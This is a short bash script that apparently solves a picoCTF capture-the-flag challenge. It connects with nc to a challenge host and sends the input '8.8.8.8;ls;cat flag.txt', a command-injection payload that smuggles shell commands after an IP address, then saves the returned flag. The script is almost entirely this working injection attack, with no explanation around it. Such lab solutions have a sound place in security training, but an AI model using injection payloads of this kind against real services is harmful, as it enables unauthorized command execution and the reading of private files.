#!/bin/bash

nc mysterious-sea.picoctf.net $1 << EOF | grep "picoCTF" > flag.txt
8.8.8.8;ls;cat flag.txt
EOF